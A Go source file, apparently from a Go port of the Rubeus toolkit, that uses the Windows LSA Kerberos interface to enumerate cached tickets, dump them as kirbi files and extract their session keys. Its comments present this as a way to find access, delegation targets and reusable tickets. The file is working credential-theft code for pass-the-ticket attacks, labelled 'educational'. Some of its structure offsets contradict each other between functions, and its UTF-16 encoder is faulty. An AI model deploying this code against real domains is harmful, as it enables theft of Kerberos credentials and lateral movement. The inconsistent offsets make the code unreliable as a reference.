//go:build windows
// +build windows

package windows

import (
	"fmt"
	"unsafe"

	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: Ticket Triage and Enumeration
//
// Triage lists all cached Kerberos tickets in the current session.
// This is useful for:
//   - Seeing what access you already have
//   - Finding forwardable tickets for delegation
//   - Identifying targets based on cached service tickets
//
// No elevation required for own session!
// With elevation, can enumerate all sessions.

// TriageTickets lists all tickets in the current session.
func TriageTickets() (*TicketCache, error) {
	return TriageTicketsForLUID(0) // 0 = current session
}

// GetCurrentDomain extracts the domain from the cached TGT realm.
func GetCurrentDomain() (string, error) {
	cache, err := TriageTickets()
	if err != nil {
		return "", err
	}

	// Find a TGT and extract the realm
	for _, tkt := range cache.Tickets {
		if len(tkt.ServerName) >= 6 && tkt.ServerName[:6] == "krbtgt" {
			return tkt.RealmName, nil
		}
	}

	// Fall back to any ticket's realm
	if len(cache.Tickets) > 0 {
		return cache.Tickets[0].RealmName, nil
	}

	return "", fmt.Errorf("no cached tickets found")
}

// TriageTicketsForLUID lists tickets for a specific logon session.
func TriageTicketsForLUID(luid uint64) (*TicketCache, error) {
	handle, err := lsaConnect()
	if err != nil {
		return nil, err
	}
	defer lsaDisconnect(handle)

	packageID, err := lsaLookupKerberosPackage(handle)
	if err != nil {
		return nil, err
	}

	// KERB_QUERY_TKT_CACHE_REQUEST
	request := make([]byte, 16)
	request[0] = byte(KerbQueryTicketCacheExMessage) // Use Ex for more info
	*(*uint64)(unsafe.Pointer(&request[4])) = luid

	var response unsafe.Pointer
	var responseSize uint32
	var protocolStatus int32

	ret, _, _ := procLsaCallAuthenticationPackage.Call(
		uintptr(handle),
		uintptr(packageID),
		uintptr(unsafe.Pointer(&request[0])),
		uintptr(len(request)),
		uintptr(unsafe.Pointer(&response)),
		uintptr(unsafe.Pointer(&responseSize)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	if ret != 0 || protocolStatus != 0 {
		if response != nil {
			procLsaFreeReturnBuffer.Call(uintptr(response))
		}
		return nil, fmt.Errorf("query failed: LSA=0x%x, Protocol=0x%x", ret, protocolStatus)
	}

	defer procLsaFreeReturnBuffer.Call(uintptr(response))

	// Parse response - KERB_QUERY_TKT_CACHE_RESPONSE
	cache := parseTicketCacheResponse(response, responseSize)
	return cache, nil
}

// parseTicketCacheResponse parses the ticket cache response.
func parseTicketCacheResponse(response unsafe.Pointer, size uint32) *TicketCache {
	if response == nil || size < 8 {
		return &TicketCache{}
	}

	// KERB_QUERY_TKT_CACHE_RESPONSE_EX:
	//   MessageType: ULONG (4 bytes)
	//   CountOfTickets: ULONG (4 bytes)
	//   Tickets: array of KERB_TICKET_CACHE_INFO_EX

	type kerbQueryResponse struct {
		MessageType    uint32
		CountOfTickets uint32
	}

	resp := (*kerbQueryResponse)(response)
	cache := &TicketCache{}

	if resp.CountOfTickets == 0 {
		return cache
	}

	// KERB_TICKET_CACHE_INFO_EX structure (64-bit):
	//   ClientName: UNICODE_STRING (16 bytes)
	//   ClientRealm: UNICODE_STRING (16 bytes)
	//   ServerName: UNICODE_STRING (16 bytes)
	//   ServerRealm: UNICODE_STRING (16 bytes)
	//   StartTime: LARGE_INTEGER (8 bytes)
	//   EndTime: LARGE_INTEGER (8 bytes)
	//   RenewTime: LARGE_INTEGER (8 bytes)
	//   EncryptionType: LONG (4 bytes)
	//   TicketFlags: ULONG (4 bytes)
	// Total: 96 bytes per ticket on 64-bit

	const ticketInfoSize = 96
	ticketsPtr := unsafe.Add(response, 8) // Skip header

	for i := uint32(0); i < resp.CountOfTickets; i++ {
		ticketPtr := unsafe.Add(ticketsPtr, uintptr(i)*ticketInfoSize)

		// Parse UNICODE_STRINGs
		serverName := parseUnicodeString(ticketPtr, 32)  // Offset 32 = ServerName
		serverRealm := parseUnicodeString(ticketPtr, 48) // Offset 48 = ServerRealm

		// Parse times and flags
		startTime := *(*int64)(unsafe.Add(ticketPtr, 64))
		endTime := *(*int64)(unsafe.Add(ticketPtr, 72))
		renewTime := *(*int64)(unsafe.Add(ticketPtr, 80))
		encType := *(*int32)(unsafe.Add(ticketPtr, 88))
		flags := *(*uint32)(unsafe.Add(ticketPtr, 92))

		cache.Tickets = append(cache.Tickets, CachedTicket{
			ServerName:     serverName,
			RealmName:      serverRealm,
			StartTime:      startTime,
			EndTime:        endTime,
			RenewTime:      renewTime,
			EncryptionType: encType,
			TicketFlags:    flags,
		})
	}

	return cache
}

// parseUnicodeString parses a UNICODE_STRING at the given offset.
func parseUnicodeString(base unsafe.Pointer, offset uintptr) string {
	// UNICODE_STRING structure:
	//   Length: USHORT (2 bytes)
	//   MaximumLength: USHORT (2 bytes)
	//   Padding: 4 bytes (on 64-bit)
	//   Buffer: PWSTR (8 bytes pointer)

	ptr := unsafe.Add(base, offset)
	length := *(*uint16)(ptr)
	bufPtr := *(*uintptr)(unsafe.Add(ptr, 8))

	if length == 0 || bufPtr == 0 {
		return ""
	}

	// Read UTF-16 string
	chars := length / 2
	result := make([]uint16, chars)
	for i := uint16(0); i < chars; i++ {
		result[i] = *(*uint16)(unsafe.Pointer(bufPtr + uintptr(i)*2))
	}

	return utf16ToString(result)
}

// utf16ToString converts UTF-16 to string.
func utf16ToString(s []uint16) string {
	result := make([]byte, 0, len(s))
	for _, c := range s {
		if c == 0 {
			break
		}
		if c < 0x80 {
			result = append(result, byte(c))
		} else if c < 0x800 {
			result = append(result, byte(0xC0|(c>>6)), byte(0x80|(c&0x3F)))
		} else {
			result = append(result, byte(0xE0|(c>>12)), byte(0x80|((c>>6)&0x3F)), byte(0x80|(c&0x3F)))
		}
	}
	return string(result)
}

// DumpTicket extracts a specific ticket from cache.
func DumpTicket(serverName string) (*ticket.Kirbi, error) {
	handle, err := lsaConnect()
	if err != nil {
		return nil, err
	}
	defer lsaDisconnect(handle)

	packageID, err := lsaLookupKerberosPackage(handle)
	if err != nil {
		return nil, err
	}

	// KERB_RETRIEVE_TKT_REQUEST
	// MessageType: DWORD
	// LogonId: LUID (8 bytes)
	// TargetName: UNICODE_STRING
	// TicketFlags: ULONG
	// CacheOptions: ULONG (KERB_RETRIEVE_TICKET_AS_KERB_CRED)
	// EncryptionType: LONG
	// CredentialsHandle: SecHandle

	serverNameUTF16 := encodeUTF16(serverName)
	requestSize := 4 + 8 + 8 + 4 + 4 + 4 + 16 + len(serverNameUTF16)
	request := make([]byte, requestSize)

	request[0] = byte(KerbRetrieveEncodedTicketMessage)
	// LogonId = 0 (current session)
	// TargetName.Length and MaximumLength
	*(*uint16)(unsafe.Pointer(&request[12])) = uint16(len(serverNameUTF16))
	*(*uint16)(unsafe.Pointer(&request[14])) = uint16(len(serverNameUTF16))
	// TargetName.Buffer offset - after the fixed header
	*(*uintptr)(unsafe.Pointer(&request[16])) = uintptr(unsafe.Pointer(&request[48]))
	// CacheOptions: KERB_RETRIEVE_TICKET_AS_KERB_CRED = 8
	*(*uint32)(unsafe.Pointer(&request[28])) = 8
	// Copy server name
	copy(request[48:], serverNameUTF16)

	var response unsafe.Pointer
	var responseSize uint32
	var protocolStatus int32

	ret, _, _ := procLsaCallAuthenticationPackage.Call(
		uintptr(handle),
		uintptr(packageID),
		uintptr(unsafe.Pointer(&request[0])),
		uintptr(requestSize),
		uintptr(unsafe.Pointer(&response)),
		uintptr(unsafe.Pointer(&responseSize)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	if ret != 0 || protocolStatus != 0 {
		if response != nil {
			procLsaFreeReturnBuffer.Call(uintptr(response))
		}
		return nil, fmt.Errorf("retrieve failed: LSA=0x%x, Protocol=0x%x", ret, protocolStatus)
	}

	defer procLsaFreeReturnBuffer.Call(uintptr(response))

	// Parse response as KRB-CRED
	return parseRetrieveResponse(response, responseSize)
}

func parseRetrieveResponse(response unsafe.Pointer, size uint32) (*ticket.Kirbi, error) {
	if response == nil || size < 8 {
		return nil, fmt.Errorf("empty response")
	}

	// KERB_RETRIEVE_TKT_RESPONSE structure (64-bit):
	// Ticket: KERB_EXTERNAL_TICKET
	//   ServiceName: KERB_EXTERNAL_NAME* (8 bytes pointer)
	//   TargetName: KERB_EXTERNAL_NAME* (8 bytes pointer)
	//   ClientName: KERB_EXTERNAL_NAME* (8 bytes pointer)
	//   DomainName: UNICODE_STRING (16 bytes)
	//   TargetDomainName: UNICODE_STRING (16 bytes)
	//   AltTargetDomainName: UNICODE_STRING (16 bytes)
	//   SessionKey: KERB_CRYPTO_KEY (4 + 4 + 8 = 16 bytes)
	//   TicketFlags: ULONG (4 bytes)
	//   Flags: ULONG (4 bytes)
	//   KeyExpirationTime: LARGE_INTEGER (8 bytes)
	//   StartTime: LARGE_INTEGER (8 bytes)
	//   EndTime: LARGE_INTEGER (8 bytes)
	//   RenewUntil: LARGE_INTEGER (8 bytes)
	//   TimeSkew: LARGE_INTEGER (8 bytes)
	//   EncodedTicketSize: ULONG (4 bytes)
	//   EncodedTicket: PUCHAR (8 bytes pointer)

	// Offsets for 64-bit:
	// SessionKey.KeyType at offset 72 (3 pointers + 3 UNICODE_STRINGs)
	// Actually, let me calculate properly:
	// 3 * 8 (pointers) = 24
	// 3 * 16 (UNICODE_STRING) = 48
	// Total to SessionKey = 72

	// SessionKey: { KeyType: LONG, Length: ULONG, Value: PUCHAR }
	// = 4 + 4 + 8 = 16 bytes
	// So SessionKey at offset 72, ends at 88

	// EncodedTicketSize at offset 72 + 16 + 4 + 4 + 8*5 = 72 + 16 + 8 + 40 = 136
	// EncodedTicket pointer at 140

	// Let's use a simpler approach - find the ticket data
	type externalTicket struct {
		_padding1         [72]byte // Skip to SessionKey
		SessionKeyType    int32
		SessionKeyLength  uint32
		SessionKeyValue   uintptr
		TicketFlags       uint32
		Flags             uint32
		KeyExpirationTime int64
		StartTime         int64
		EndTime           int64
		RenewUntil        int64
		TimeSkew          int64
		EncodedTicketSize uint32
		_pad              uint32
		EncodedTicket     uintptr
	}

	ticket := (*externalTicket)(response)

	if ticket.EncodedTicketSize == 0 || ticket.EncodedTicket == 0 {
		return nil, fmt.Errorf("no encoded ticket in response")
	}

	// Copy the encoded ticket data
	ticketData := make([]byte, ticket.EncodedTicketSize)
	copy(ticketData, (*[1 << 20]byte)(unsafe.Pointer(ticket.EncodedTicket))[:ticket.EncodedTicketSize])

	// Parse as Kirbi
	return parseKirbiFromBytes(ticketData)
}

func parseKirbiFromBytes(data []byte) (*ticket.Kirbi, error) {
	return ticket.ParseKirbi(data)
}

// RetrieveSessionKey retrieves a ticket and its session key from the cache
type TicketWithKey struct {
	Ticket     *ticket.Kirbi
	SessionKey []byte
	KeyType    int32
}

func RetrieveTicketWithSessionKey(serverName string) (*TicketWithKey, error) {
	handle, err := lsaConnect()
	if err != nil {
		return nil, err
	}
	defer lsaDisconnect(handle)

	packageID, err := lsaLookupKerberosPackage(handle)
	if err != nil {
		return nil, err
	}

	// RUBEUS APPROACH: Allocate struct + string, marshal, then manually fix Buffer pointer
	// KERB_RETRIEVE_TKT_REQUEST structure (64-bit):
	//   Offset 0:  MessageType (4 bytes) + LUID padding (4 bytes)
	//   Offset 8:  LogonId (8 bytes)
	//   Offset 16: TargetName.Length (2 bytes)
	//   Offset 18: TargetName.MaximumLength (2 bytes)
	//   Offset 20: padding (4 bytes for 8-byte alignment)
	//   Offset 24: TargetName.Buffer (8 bytes ptr)
	//   Offset 32: TicketFlags (4 bytes)
	//   Offset 36: CacheOptions (4 bytes)
	//   Offset 40: EncryptionType (4 bytes)
	//   Offset 44: padding (4 bytes)
	//   Offset 48: CredentialsHandle (16 bytes)
	//   Total struct size: 64 bytes
	//   Followed by: target name string (Unicode)

	// Encode target to UTF16
	targetUTF16 := encodeUTF16(serverName)
	strLen := uint16(len(targetUTF16))

	structSize := 64
	totalSize := structSize + len(targetUTF16)
	request := make([]byte, totalSize)

	// MessageType = 8 (KerbRetrieveEncodedTicketMessage)
	*(*uint32)(unsafe.Pointer(&request[0])) = uint32(KerbRetrieveEncodedTicketMessage)

	// LogonId = 0 (at offset 8)
	// (already zeroed)

	// TargetName.Length at offset 16
	*(*uint16)(unsafe.Pointer(&request[16])) = strLen
	// TargetName.MaximumLength at offset 18
	*(*uint16)(unsafe.Pointer(&request[18])) = strLen

	// Copy target string at offset 64 (end of struct)
	copy(request[structSize:], targetUTF16)

	// CRITICAL: Calculate absolute address for Buffer pointer
	// This is what Rubeus does: newTargetNameBuffPtr = unmanagedAddr + structSize
	// Then WriteIntPtr at offset 24
	requestBaseAddr := uintptr(unsafe.Pointer(&request[0]))
	stringAddr := requestBaseAddr + uintptr(structSize)
	*(*uintptr)(unsafe.Pointer(&request[24])) = stringAddr

	// CacheOptions at offset 36 = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY (2) | AS_KERB_CRED (8) = 0x8
	// Actually Rubeus uses just USE_CACHE_ONLY (2) in GetEncryptionKeyFromCache
	*(*uint32)(unsafe.Pointer(&request[36])) = 2 // KERB_RETRIEVE_TICKET_USE_CACHE_ONLY

	// EncryptionType at offset 40 - 0 means any
	// (already zeroed)

	var response unsafe.Pointer
	var responseSize uint32
	var protocolStatus int32

	ret, _, _ := procLsaCallAuthenticationPackage.Call(
		uintptr(handle),
		uintptr(packageID),
		uintptr(unsafe.Pointer(&request[0])),
		uintptr(totalSize),
		uintptr(unsafe.Pointer(&response)),
		uintptr(unsafe.Pointer(&responseSize)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	if ret != 0 || protocolStatus != 0 {
		if response != nil {
			procLsaFreeReturnBuffer.Call(uintptr(response))
		}
		return nil, fmt.Errorf("retrieve failed: LSA=0x%x, Protocol=0x%x", ret, protocolStatus)
	}

	defer procLsaFreeReturnBuffer.Call(uintptr(response))

	// Extract ticket with session key
	return parseRetrieveResponseWithKey(response, responseSize)
}

func parseRetrieveResponseWithKey(response unsafe.Pointer, size uint32) (*TicketWithKey, error) {
	if response == nil || size < 8 {
		return nil, fmt.Errorf("empty response")
	}

	type externalTicket struct {
		_padding1         [72]byte
		SessionKeyType    int32
		SessionKeyLength  uint32
		SessionKeyValue   uintptr
		TicketFlags       uint32
		Flags             uint32
		KeyExpirationTime int64
		StartTime         int64
		EndTime           int64
		RenewUntil        int64
		TimeSkew          int64
		EncodedTicketSize uint32
		_pad              uint32
		EncodedTicket     uintptr
	}

	tkt := (*externalTicket)(response)

	var sessionKey []byte
	if tkt.SessionKeyLength > 0 && tkt.SessionKeyValue != 0 {
		sessionKey = make([]byte, tkt.SessionKeyLength)
		copy(sessionKey, (*[1 << 10]byte)(unsafe.Pointer(tkt.SessionKeyValue))[:tkt.SessionKeyLength])
	}

	var kirbi *ticket.Kirbi
	if tkt.EncodedTicketSize > 0 && tkt.EncodedTicket != 0 {
		ticketData := make([]byte, tkt.EncodedTicketSize)
		copy(ticketData, (*[1 << 20]byte)(unsafe.Pointer(tkt.EncodedTicket))[:tkt.EncodedTicketSize])
		kirbi, _ = ticket.ParseKirbi(ticketData)
	}

	return &TicketWithKey{
		Ticket:     kirbi,
		SessionKey: sessionKey,
		KeyType:    tkt.SessionKeyType,
	}, nil
}

func encodeUTF16(s string) []byte {
	result := make([]byte, len(s)*2)
	for i, r := range s {
		result[i*2] = byte(r)
		result[i*2+1] = byte(r >> 8)
	}
	return result
}
